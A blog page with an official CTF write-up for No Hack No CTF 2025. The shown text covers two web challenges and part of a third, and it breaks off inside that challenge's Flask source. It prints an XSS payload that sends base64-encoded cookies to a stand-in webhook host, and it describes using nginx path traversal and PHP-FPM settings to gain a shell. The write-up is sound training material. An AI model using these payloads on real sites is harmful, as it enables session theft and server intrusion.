<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allWelcome to the No Hack No CTF Event this year, I made some “relatively harder” crypto and web challenges in the event, with some “relatively easier” ones.And one guessy challenge, which is j">
<meta property="og:type" content="article">
<meta property="og:title" content="No Hack No CTF 2025 Official Write Up - Whale120">
<meta property="og:url" content="http://wha13.github.io/2025/07/07/2025-nhnc-official/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allWelcome to the No Hack No CTF Event this year, I made some “relatively harder” crypto and web challenges in the event, with some “relatively easier” ones.And one guessy challenge, which is j">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/H1lmjRuHxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkfD8h_Sxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkVII2OBlg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk8uv3dBlg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkxWO3uBgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk22_CuSle.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1iwdp_Blg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJVEcRdrge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hy6L9RdHge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Skq9sAOSgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1YWfytSge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H13xMyFrlx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyAcEytSlx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkikHkKBgl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkYMLyKHgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BygzPkKBxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hy9j51Frgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1doEgFrll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1tCNetSll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1IlHeYBxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Syv7SxtSel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJscSxYBgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hyxk8xtrxl.png">
<meta property="article:published_time" content="2025-07-07T16:00:09.667Z">
<meta property="article:modified_time" content="2025-07-07T16:00:09.667Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="XSLeak">
<meta property="article:tag" content="LLL">
<meta property="article:tag" content="No Hack No CTF">
<meta property="article:tag" content="Coppersmith&#39;s Attack">
<meta property="article:tag" content="Franklin–Reiter Attack">
<meta property="article:tag" content="GuessyCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/H1lmjRuHxx.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>No Hack No CTF 2025 Official Write Up - Whale120</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/07/27/htb-manager/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/06/30/2025-bugbountyctf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/07/07/2025-nhnc-official/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&text=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&is_video=false&description=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=No Hack No CTF 2025 Official Write Up - Whale120&body=Check out this article: http://wha13.github.io/2025/07/07/2025-nhnc-official/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&title=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/07/07/2025-nhnc-official/&name=No Hack No CTF 2025 Official Write Up - Whale120&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/07/07/2025-nhnc-official/&t=No Hack No CTF 2025 Official Write Up - Whale120"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXS-XSS"><span class="toc-number">2.1.</span> <span class="toc-text">XXS XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#When"><span class="toc-number">2.2.</span> <span class="toc-text">When?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NOT-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">NOT XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bloCkchAin-ciphEr%E2%80%99S-sERcret"><span class="toc-number">3.1.</span> <span class="toc-text">bloCkchAin ciphEr’S sERcret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier"><span class="toc-number">3.2.</span> <span class="toc-text">🐺 Verifier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier-1"><span class="toc-number">3.3.</span> <span class="toc-text">🐺 Verifier +</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%90%BA-Verifier-Max"><span class="toc-number">3.4.</span> <span class="toc-text">🐺 Verifier Max</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Yep-another-smake-game"><span class="toc-number">4.1.</span> <span class="toc-text">Yep another smake game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IECD-SHELL"><span class="toc-number">4.2.</span> <span class="toc-text">IECD-SHELL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Status-and-revenge"><span class="toc-number">5.1.</span> <span class="toc-text">Server Status (and revenge)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessyCTF"><span class="toc-number">6.</span> <span class="toc-text">GuessyCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GuessyCTF-1"><span class="toc-number">6.1.</span> <span class="toc-text">GuessyCTF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">7.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        No Hack No CTF 2025 Official Write Up - Whale120
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-07T16:00:09.667Z" class="dt-published" itemprop="datePublished">2025-07-07</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Coppersmith-s-Attack/" rel="tag">Coppersmith's Attack</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/Franklin%E2%80%93Reiter-Attack/" rel="tag">Franklin–Reiter Attack</a>, <a class="p-category" href="/tags/GuessyCTF/" rel="tag">GuessyCTF</a>, <a class="p-category" href="/tags/LLL/" rel="tag">LLL</a>, <a class="p-category" href="/tags/No-Hack-No-CTF/" rel="tag">No Hack No CTF</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/XSLeak/" rel="tag">XSLeak</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Welcome to the No Hack No CTF Event this year, I made some “relatively harder” crypto and web challenges in the event, with some “relatively easier” ones.<br><del>And one guessy challenge, which is just a pure waste of time</del>  </p>
<p>Hope u guys love them, and … <del>actually, I didn’t expect like as much as like 400~500 players will participate in this year’s rating 0 event, with some strong teams…so the challenge difficulty may not hard enough XD</del>  </p>
<p>After all, I think u can probably looking forward to my(our) challenges next year, trust me, will be funnier!  </p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Actually…just picking categories my teammates haven’t done yet…<br><del>But all my favorite ones in web category!</del><br><img src="https://hackmd.io/_uploads/H1lmjRuHxx.png" alt="image"></p>
<h3 id="XXS-XSS"><a href="#XXS-XSS" class="headerlink" title="XXS XSS"></a>XXS XSS</h3><ul>
<li>Difficuly: 5&#x2F;10</li>
<li>Tips: Open Redirect to XSS(<code>javasciprt:</code> protocol trick)</li>
</ul>
<p>A XSS Challenge<br>Just take a look at this part:  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">getQueryParam</span>(<span class="params">key</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> params.<span class="title function_">get</span>(key) || <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> name = <span class="title function_">getQueryParam</span>(<span class="string">&#x27;name&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> targetUrl = <span class="title function_">getQueryParam</span>(<span class="string">&#x27;url&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> display = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;displayName&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  display.<span class="property">textContent</span> = name || <span class="string">&#x27;Guest&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (targetUrl &amp;&amp; targetUrl.<span class="property">length</span>&lt;=<span class="number">15</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>You can set a name that the website will show on your screen, also, a redirect url with length &lt; 15<br>It’s seemingly that the only way to exploit XSS is to abuse the redirect function, but how can we steal the cookie with like less then 15 chars (contains <code>javascript:</code> string)  </p>
<p>A fun feature: if <code>javascript:</code> url was appended with a javascript variable, then the page will render the variable value  </p>
<p>So just put the payload at name, and then redirect to <code>javascript:name</code> can solve it!<br>Final Payload:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;img src=x onerror=&quot;location.href=&#x27;webhookurl/&#x27;+btoa(document.cookie)&quot;&amp;url=javascript:name</span><br></pre></td></tr></table></figure>

<h3 id="When"><a href="#When" class="headerlink" title="When?"></a>When?</h3><ul>
<li>Difficuly: 6&#x2F;10</li>
<li>Tips: Nginx <code>/file../</code> LFI Bug + Attacking PHP-FPM</li>
</ul>
<p>A cute black box challenge, with a view-source, we will find a <code>/file</code> directory (favicon.ico location) allow listing:<br><img src="https://hackmd.io/_uploads/SkfD8h_Sxx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkVII2OBlg.png" alt="image"></p>
<p>Query some strange stuffs like <code>/file/whale</code> will leak that it’s hosted on NGINX, <del>or via guessing</del>  </p>
<p><img src="https://hackmd.io/_uploads/Bk8uv3dBlg.png" alt="image"></p>
<p>In nginx config file, it’s well known that this kind of setting will lead to path traversal for one file layer:  </p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /file &#123;</span><br><span class="line">    <span class="attribute">alias</span> /app/file/;</span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">autoindex_exact_size</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">autoindex_localtime</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SkxWO3uBgx.png" alt="image"><br>take a look at socket-test-8cb09a.php~  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$socket</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$socket</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$socket</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>through nginx.conf, we’ll also find that it’s based on <code>php-fpm</code>, which is vulnerable via changing its setting <code>auto_prepend_file = php://input</code> and <code>allow_url_include = On</code>, after that, every post body (pass to php:&#x2F;&#x2F;input) will be seem as a php code and excute.  </p>
<p>In this step, there’re many exploits online like this one: <a target="_blank" rel="noopener" href="https://gist.github.com/Jimmy01240397/c833ef20bac520ce8212147fb8457d1a">https://gist.github.com/Jimmy01240397/c833ef20bac520ce8212147fb8457d1a</a>, by my friend chumy.  </p>
<p>with the socket backdoor, just pass the payload(base64 encoded) to it and we’ll obtain a shell!  </p>
<h3 id="NOT-XSS"><a href="#NOT-XSS" class="headerlink" title="NOT XSS"></a>NOT XSS</h3><ul>
<li>Difficuly: 9&#x2F;10</li>
<li>Tips: XSLeak (Via Cookie Size, STTF)</li>
</ul>
<p>A word guessing game, target is flag, but only admin bot can visit it and also, with CORS.<br>The best match value and a note (will be rendered with HTML) will be stored in cookie  </p>
<p>The stored note will be rendered, but with a DOMPurify Protection!<br>Just don’t mind those PoW stuffs, as I said above, it’s impossible to do a XSS, so time to think about XSLeak.  </p>
<p><strong>app.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify, make_response, abort, session</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>, template_folder=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line">CORS(app, resources=&#123;<span class="string">r&quot;/*&quot;</span>: &#123;<span class="string">&quot;origins&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000&quot;</span>&#125;&#125;, supports_credentials=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&#x27;NHNC&#123;B1g_c00k13_a193eb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terminate_process</span>(<span class="params">process</span>):</span><br><span class="line">    process.terminate()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Process terminated after 20 seconds.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common_prefix</span>(<span class="params">a: <span class="built_in">str</span>, b: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(a) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(b) <span class="keyword">and</span> a[i] == b[i]:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a[:i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restrict_remote_addr</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_challenge&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_challenge</span>():</span><br><span class="line">    challenge = os.urandom(<span class="number">8</span>).<span class="built_in">hex</span>()</span><br><span class="line">    session[<span class="string">&#x27;challenge&#x27;</span>] = challenge</span><br><span class="line">    session[<span class="string">&#x27;ts&#x27;</span>] = time.time()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&quot;challenge&quot;</span>: challenge,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Find a nonce such that SHA256(challenge + nonce) starts with 000000&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/visit&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    nonce = request.args.get(<span class="string">&#x27;nonce&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url <span class="keyword">or</span> <span class="keyword">not</span> nonce:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Missing url or nonce&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad Hacker&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    challenge = session.get(<span class="string">&#x27;challenge&#x27;</span>)</span><br><span class="line">    ts = session.get(<span class="string">&#x27;ts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> challenge <span class="keyword">or</span> <span class="keyword">not</span> ts:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No challenge in session. Please request /get_challenge first.&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> time.time() - ts &gt; <span class="number">60</span>:</span><br><span class="line">        session.pop(<span class="string">&#x27;challenge&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        session.pop(<span class="string">&#x27;ts&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Challenge expired. Please request a new one.&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    h = hashlib.sha256((challenge + nonce).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> h.startswith(<span class="string">&quot;000000&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid PoW&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># No reuse of PoW</span></span><br><span class="line">    session.pop(<span class="string">&#x27;challenge&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;ts&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen([<span class="string">&#x27;chromium&#x27;</span>, url, <span class="string">&#x27;--headless&#x27;</span>, 